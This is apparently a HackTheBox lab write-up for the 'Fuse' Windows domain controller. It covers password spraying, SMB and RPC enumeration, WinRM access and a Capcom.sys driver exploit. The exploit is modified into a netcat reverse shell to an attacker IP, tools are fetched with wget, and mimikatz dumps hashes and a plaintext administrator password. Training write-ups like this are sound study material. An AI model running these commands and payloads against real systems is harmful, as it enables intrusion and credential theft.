# Fuse | HackTheBox

### 1. Scan
```bash
kali@kali:~$ sudo nmap -A -p- -T4 10.10.10.193
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 08:18 EDT
Nmap scan report for 10-10-10-193.tpgi.com.au (10.10.10.193)
Host is up (0.33s latency).
Not shown: 65514 filtered ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-26 12:48:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49675/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  msrpc        Microsoft Windows RPC
49698/tcp open  msrpc        Microsoft Windows RPC
49753/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=9/26%Time=5F6F3421%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|2012 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (90%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h39m33s, deviation: 4h02m32s, median: 19m31s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Fuse
|   NetBIOS computer name: FUSE\x00
|   Domain name: fabricorp.local
|   Forest name: fabricorp.local
|   FQDN: Fuse.fabricorp.local
|_  System time: 2020-09-26T05:51:29-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-09-26T12:51:28
|_  start_date: 2020-09-25T16:25:19

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   334.78 ms 10.10.14.1
2   334.95 ms 10-10-10-193.tpgi.com.au (10.10.10.193)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 974.67 seconds
```
The machine is running a HTTP server, and then a bunch of other services related to Active Directory. WinRM is also present. The domain name is fabricorp.local, with the computer name being Fuse.

### 2. Enumerate SMB and HTTP
Starting with SMB, I try to look at shares using the guest account but get an "account disabled" error.
```bash
kali@kali:~$ smbclient -U 'guest' -L \\10.10.10.193
Enter WORKGROUP\guest's password: 
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```
Also using CME:
```bash
kali@kali:~$ crackmapexec smb 10.10.10.193
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)

kali@kali:~$ crackmapexec smb 10.10.10.193 --shares -u '' -p ''
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\: STATUS_ACCESS_DENIED 
SMB         10.10.10.193    445    FUSE             [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)

```
SMBv1 is enabled with signing set to True, but no share information can be retrieved. I did some light googling to see if there were any unauthenticated SMB vulnerabilities and came upon this cool article about some of the biggest ones: https://blog.malwarebytes.com/101/2018/12/how-threat-actors-are-using-smb-vulnerabilities/, but none which can be used if I can not get some sort of access to shares.  
  
Moving on to port 80, there is a Papercut-NG pring logging application. There are some live print logs viewable, which provides a number of document names, client machines and also usernames:
- administrator
- sthompson
- bhult
- pmerton
- tlavel
- bnielson  
Of these, only administrator is printing from the client name FUSE.

### 3. Enumerate LDAP
Get the domain SID:
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ rpcclient -W '' -U''%'' 10.10.10.193 -c 'lsaquery'
Domain Name: FABRICORP
Domain Sid: S-1-5-21-2633719317-1471316042-3957863514
```
Trying to get the domain details:
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ ldapsearch -h 10.10.10.193 -x -s sub -b 'DC=fabricorp,DC=local'
# extended LDIF
#
# LDAPv3
# base <DC=fabricorp,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A6C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v3839

# numResponses: 1
```
This doesn't work because LDAP wants a valid user. This will prevent me from using ldap for now.

### 3. Guess a password
I was kinda stuck at this point. Reading the forums, I got a hint to use what was in front of me. This is something I have heard before on a previous machine, Blunder, in which I made a password list using content from the available website. I can take the same approach here.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ cewl -d 2 -m 5 -w pcutwordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```
Then I can use crackmapexec to try the usenames and password lists with various services.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ crackmapexec smb 10.10.10.193 -u usernames.txt -p pcutwordlist.txt 
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:Print STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:PaperCut STATUS_LOGON_FAILURE
...
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:mountain STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:request STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:153kb STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:bhult STATUS_LOGON_FAILURE 
...
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:tapes STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:mountain STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:request STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:153kb STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:bhult STATUS_LOGON_FAILURE 
...
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:mountain STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:request STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:Fabricorp01 STATUS_PASSWORD_MUST_CHANGE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:153kb STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:bhult STATUS_LOGON_FAILURE 
```
Among all the failures there are three accounts that returned PASSWORD_MUST_CHANGE. It would appear Fabricorp01 is most likely the default password for new users, and so these must be reset before they can be used. The tool to reset password is called smbpasswd: https://www.samba.org/samba/docs/current/man-html/smbpasswd.8.html  
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ smbpasswd -r 10.10.10.193 -U tlavel
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user bhult
```
I can now enumerate from this user. Sadly CME still won't log me in.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ crackmapexec smb 10.10.10.193 -u tlavel -p Fabricorp1000
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:Fabricorp1000 STATUS_LOGON_FAILURE
```
However I can connect via rpcclient and get lots of information.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ rpcclient -U tlavel 10.10.10.193
Enter WORKGROUP\tlavel's password: 
rpcclient $>
```
Dump usernames, including some that weren't in the printer history:
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ rpcclient -U tlavel 10.10.10.193
Enter WORKGROUP\tlavel's password: 
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[svc-print] rid:[0x450]
user:[bnielson] rid:[0x451]
user:[sthompson] rid:[0x641]
user:[tlavel] rid:[0x642]
user:[pmerton] rid:[0x643]
user:[svc-scan] rid:[0x645]
user:[bhult] rid:[0x1bbd]
user:[dandrews] rid:[0x1bbe]
user:[mberbatov] rid:[0x1db1]
user:[astein] rid:[0x1db2]
user:[dmuir] rid:[0x1db3]
```
Dumping SIDS:
```bash
rpcclient $> lsaenumsid
found 18 SIDs

S-1-5-9
S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
S-1-5-80-0
S-1-5-6
S-1-5-32-568
S-1-5-32-559
S-1-5-32-554
S-1-5-32-551
S-1-5-32-550
S-1-5-32-549
S-1-5-32-548
S-1-5-32-545
S-1-5-32-544
S-1-5-20
S-1-5-19
S-1-5-11
S-1-1-0
```
Enumerate printers:
```bash
rpcclient $> enumprinters
        flags:[0x800000]
        name:[\\10.10.10.193\HP-MFT01]
        description:[\\10.10.10.193\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]
        comment:[]

```
This is another password that can be used against the larger list of usernames I now have.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ crackmapexec smb 10.10.10.193 -u usernames.txt -p '$fab@s3Rv1ce$1'
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\administrator:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bhult:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\sthompson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\pmerton:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\tlavel:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [-] fabricorp.local\bnielson:$fab@s3Rv1ce$1 STATUS_LOGON_FAILURE 
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
```
The password is valid for the printer service account.
Now I can list readable shares:
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ crackmapexec smb 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1' --shares
SMB         10.10.10.193    445    FUSE             [*] Windows Server 2016 Standard 14393 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True)
SMB         10.10.10.193    445    FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 
SMB         10.10.10.193    445    FUSE             [+] Enumerated shares
SMB         10.10.10.193    445    FUSE             Share           Permissions     Remark
SMB         10.10.10.193    445    FUSE             -----           -----------     ------
SMB         10.10.10.193    445    FUSE             ADMIN$                          Remote Admin
SMB         10.10.10.193    445    FUSE             C$                              Default share
SMB         10.10.10.193    445    FUSE             HP-MFT01                        HP-MFT01
SMB         10.10.10.193    445    FUSE             IPC$                            Remote IPC
SMB         10.10.10.193    445    FUSE             NETLOGON        READ            Logon server share 
SMB         10.10.10.193    445    FUSE             print$          READ            Printer Drivers
SMB         10.10.10.193    445    FUSE             SYSVOL          READ            Logon server share
```
Logging in via SMB client:
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ smbclient \\\\fabricorp.local\\print$ -U svc-print
Enter WORKGROUP\svc-print's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 29 20:12:41 2020
  ..                                  D        0  Fri May 29 20:12:41 2020
  color                               D        0  Sat Jul 16 09:18:08 2016
  IA64                                D        0  Fri May 29 20:12:41 2020
  W32X86                              D        0  Mon Jun  1 05:03:44 2020
  x64                                 D        0  Mon Jun  1 05:03:46 2020

                10340607 blocks of size 4096. 7454608 blocks available
smb: \>
```
Looking through this share, there is legit only printer drivers on here and basically nothing else. So I can go back to CME and look at WinRM.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ crackmapexec winrm 10.10.10.193 -u usernames.txt -p '$fab@s3Rv1ce$1'
WINRM       10.10.10.193    5985   FUSE             [*] http://10.10.10.193:5985/wsman
WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\administrator:$fab@s3Rv1ce$1 "Failed to authenticate the user administrator with ntlm"
WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\bhult:$fab@s3Rv1ce$1 "Failed to authenticate the user bhult with ntlm"
WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\sthompson:$fab@s3Rv1ce$1 "Failed to authenticate the user sthompson with ntlm"
WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\pmerton:$fab@s3Rv1ce$1 "Failed to authenticate the user pmerton with ntlm"
WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\tlavel:$fab@s3Rv1ce$1 "Failed to authenticate the user tlavel with ntlm"
WINRM       10.10.10.193    5985   FUSE             [-] FABRICORP\bnielson:$fab@s3Rv1ce$1 "Failed to authenticate the user bnielson with ntlm"
WINRM       10.10.10.193    5985   FUSE             [+] FABRICORP\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```
WinRM can be used to get a shell on the machine.
```bash
kali@kali:~/Desktop/ctf/htb/fuse$ evil-winrm -i 10.10.10.193 -u svc-print -p '$fab@s3Rv1ce$1'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-print\Documents> whoami
fabricorp\svc-print
```

### 4. Enumerate from WinRM
Collect some basic info about the computer:
```bash
*Evil-WinRM* PS C:\Users\svc-print\Links\.jib1337> Get-ComputerInfo

WindowsBuildLabEx                                       : 14393.3686.amd64fre.rs1_release.200504-1524
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server Core
WindowsInstallDateFromRegistry                          : 5/27/2020 5:36:00 AM
WindowsProductId                                        : 00376-30821-30176-AA796
WindowsProductName                                      : Windows Server 2016 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
```
Drop WinPEAs and run it (see winpeasout.txt), however it comes up pretty bare.
```bash
*Evil-WinRM* PS C:\Users\svc-print\Links\.jib1337> ./peas.exe
ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
   Creating Dynamic lists, this could take a while, please wait...
   - Checking if domain...
   - Getting Win32_UserAccount info...
Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
   at System.Management.ThreadDispatch.Start()
   at System.Management.ManagementScope.Initialize()
   at System.Management.ManagementObjectSearcher.Initialize()
   at System.Management.ManagementObjectSearcher.Get()
   at winPEAS.Program.CreateDynamicLists()
   - Creating current user groups list...
   - Creating active users list...
...
```
On the C drive, there is a readme.txt, referencing the test directory.
```bash
*Evil-WinRM* PS C:\> cat readme.txt
// MFT printing format issue

note to HP engineer:

The "test" directory has been created. For repeated tests while diagnosing this issue, the same folder should be used.

This is a production environment and the "solution" should be developed and confirmed working in your testbed

All changes will be reverted every 2 mins.

*Evil-WinRM* PS C:\> ls  test


    Directory: C:\test


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/27/2020   8:51 PM          10576 Capcom.sys

*Evil-WinRM* PS C:\test> download Capcom.sys
Info: Downloading C:\test\Capcom.sys to Capcom.sys

                                                             
Info: Download successful!
```
Doing some web searching for capcom.sys reveals a privilege escalation path involving loading a modified driver which can execute code as the kernel. I will attempt to do it by using https://github.com/tandasat/ExploitCapcom together with the process detailed at https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/. It can only be done if the use has the SELoadDriverPrivilege enabled, but I can see this privilege is available to use when looking back over the winPEAS output.

### 5. Build the exploit
First thing to do is grab the repos that are needed.
```bash
kali@kali:~/Desktop/ctf/htb/fuse/exploit$ git clone https://github.com/TarlogicSecurity/EoPLoadDriver.git
Cloning into 'EoPLoadDriver'...
remote: Enumerating objects: 10, done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
Unpacking objects: 100% (10/10), 5.14 KiB | 2.57 MiB/s, done.

kali@kali:~/Desktop/ctf/htb/fuse/exploit$ git clone https://github.com/tandasat/ExploitCapcom.git
Cloning into 'ExploitCapcom'...
remote: Enumerating objects: 1, done.
remote: Counting objects: 100% (1/1), done.
remote: Total 34 (delta 0), reused 0 (delta 0), pack-reused 33
Unpacking objects: 100% (34/34), 133.74 KiB | 288.00 KiB/s, done.
```
Firstly I need to modify the ExploitCapcom.cpp to execute a reverse shell instead of spawning a command prompt. This is the current code for spawning a shell in the ExploitCamcom code:
```cpp
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```
This gets modified to:
```cpp
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Users\\svc-print\\Videos\\jib1337\\nc.exe");
    TCHAR CommandArgs[] = TEXT("C:\\Users\\svc-print\\Videos\\jib1337\\nc.exe -e cmd.exe 10.10.15.158 9999");

    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandArgs, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```
If this works it should use my uploaded netcat binary to launch a reverse shell as System.  
Next I have to build both programs. To do this I can use Visual Studio.

### 6. Do the exploit to escalate
Once I have built the exes, I just have to copy them to the machine and execute them with a port listening.
```bash
*Evil-WinRM* PS C:\Users\svc-print\Videos\jib1337> wget -Uri http://10.10.15.158:8000/nc.exe -OutFile nc.exe
*Evil-WinRM* PS C:\Users\svc-print\Videos\jib1337> wget -Uri http://10.10.15.158:8000/ExploitCapcom.exe -OutFile ec.exe
*Evil-WinRM* PS C:\Users\svc-print\Videos\jib1337> wget -Uri http://10.10.15.158:8000/EOPLOADDRIVER.exe -OutFile load.exe
*Evil-WinRM* PS C:\Users\svc-print\Videos\jib1337> ./load.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\MyService
NTSTATUS: c000003a, WinError: 0
*Evil-WinRM* PS C:\Users\svc-print\Videos\jib1337> ./ec.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000249B0850008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```
The driver exploit triggers and connects back to my listening netcat.
```bash
ali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.193 57175
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\svc-print\Videos\jib1337>whoami
whoami
nt authority\system

C:\Users\svc-print\Videos\jib1337>powershell.exe
powershell.exe
PS C:\Users\svc-print\Videos\jib1337> wget -Uri http://10.10.15.158:8000/mimikatz.exe -OutFile meow.exe 
wget -Uri http://10.10.15.158:8000/mimikatz.exe -OutFile meow.exe
PS C:\Users\svc-print\Videos\jib1337> ./meow exe "privilege::debug" "sekurlsa::logonpasswords" exit
./meow exe "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  7 2020 02:22:31
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # exe
ERROR mimikatz_doLocal ; "exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 707974 (00000000:000acd86)
Session           : Interactive from 1
User Name         : administrator
Domain            : FABRICORP
Logon Server      : FUSE
Logon Time        : 9/27/2020 2:23:23 PM
SID               : S-1-5-21-2633719317-1471316042-3957863514-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : FABRICORP
         * NTLM     : 370ddcf45959b2293427baa70376e14e
         * SHA1     : afc4e9d4fb3a145401fc619cabfff49a76564d88
         * DPAPI    : 58cadbc4ce5d040bf93d509436cd115d
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : FABRICORP
         * Password : (null)
        kerberos :
         * Username : administrator
         * Domain   : FABRICORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 34997 (00000000:000088b5)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/27/2020 2:21:54 PM
SID               : 
        msv :
         [00000003] Primary
         * Username : FUSE$
         * Domain   : FABRICORP
         * NTLM     : 2a00bfda96cf7a978bf672167de416e8
         * SHA1     : 98fb5134c4dfb7d3332ba2d6527d764b24418826
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 13242731 (00000000:00ca116b)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 9/27/2020 10:18:50 PM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
        msv :
         [00000003] Primary
         * Username : FUSE$
         * Domain   : FABRICORP
         * NTLM     : 2a00bfda96cf7a978bf672167de416e8
         * SHA1     : 98fb5134c4dfb7d3332ba2d6527d764b24418826
        tspkg :
        wdigest :
         * Username : FUSE$
         * Domain   : FABRICORP
         * Password : (null)
        kerberos :
         * Username : FUSE$
         * Domain   : fabricorp.local
         * Password : c0 22 20 e9 92 3a f7 bf d4 0c 93 39 11 54 39 6d 27 1b 91 85 86 56 25 79 e3 12 ae 39 a5 fd 7f 45 30 15 21 62 2b 51 25 96 4f d8 a8 01 94 11 d3 4e c9 e1 c7 fc fc fc 91 df a5 8c e5 3e 6f a0 aa c4 fc 1c 61 cf e8 0f 6e d7 21 3c 8f 59 05 88 e0 25 06 73 e8 d1 54 4b 0f 0c 00 2a 33 31 26 56 10 b4 c4 b0 ac 58 ca 4d 08 08 de 6c 03 33 1f 1d 11 1a b7 c2 bf 23 34 83 45 6f 51 20 92 90 0f 86 18 fd c3 b0 5a 91 cf 6c 9f b2 28 7a 47 6d d9 33 ef 5f 7a 3f 78 85 e8 f0 6c 4e e4 8b 89 a1 fc d9 7c 61 eb 46 1e fb 3b c2 14 9d bc e3 2b f5 9c 78 50 88 01 d2 de 9f f0 71 90 9b c8 b4 35 a2 cf 9b 9d a9 06 fa 24 d6 38 74 9b d2 bc 23 b0 5d 09 63 0b 52 ec ad 0a ee 38 2c 56 af 78 b5 34 89 10 09 38 f1 d8 6a eb 3a 26 b5 30 e3 10 e3 61 c3 6a 4c b6 26 
        ssp :
        credman :

Authentication Id : 0 ; 879482 (00000000:000d6b7a)
Session           : Interactive from 0
User Name         : Administrator
Domain            : FABRICORP
Logon Server      : FUSE
Logon Time        : 9/27/2020 2:23:35 PM
SID               : S-1-5-21-2633719317-1471316042-3957863514-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : FABRICORP
         * NTLM     : 370ddcf45959b2293427baa70376e14e
         * SHA1     : afc4e9d4fb3a145401fc619cabfff49a76564d88
         * DPAPI    : 58cadbc4ce5d040bf93d509436cd115d
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : FABRICORP
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : fabricorp.local
         * Password : K3epEmH4cK3rzoUttaH3re!
        ssp :
        credman :

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/27/2020 2:22:23 PM
SID               : S-1-5-17
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : FUSE$
Domain            : FABRICORP
Logon Server      : (null)
Logon Time        : 9/27/2020 2:21:54 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : FUSE$
         * Domain   : FABRICORP
         * Password : (null)
        kerberos :
         * Username : fuse$
         * Domain   : FABRICORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : FUSE$
Domain            : FABRICORP
Logon Server      : (null)
Logon Time        : 9/27/2020 2:21:55 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : FUSE$
         * Domain   : FABRICORP
         * NTLM     : 2a00bfda96cf7a978bf672167de416e8
         * SHA1     : 98fb5134c4dfb7d3332ba2d6527d764b24418826
        tspkg :
        wdigest :
         * Username : FUSE$
         * Domain   : FABRICORP
         * Password : (null)
        kerberos :
         * Username : fuse$
         * Domain   : FABRICORP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 798501 (00000000:000c2f25)
Session           : Interactive from 0
User Name         : Administrator
Domain            : FABRICORP
Logon Server      : FUSE
Logon Time        : 9/27/2020 2:23:27 PM
SID               : S-1-5-21-2633719317-1471316042-3957863514-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : FABRICORP
         * NTLM     : 370ddcf45959b2293427baa70376e14e
         * SHA1     : afc4e9d4fb3a145401fc619cabfff49a76564d88
         * DPAPI    : 58cadbc4ce5d040bf93d509436cd115d
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : FABRICORP
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : fabricorp.local
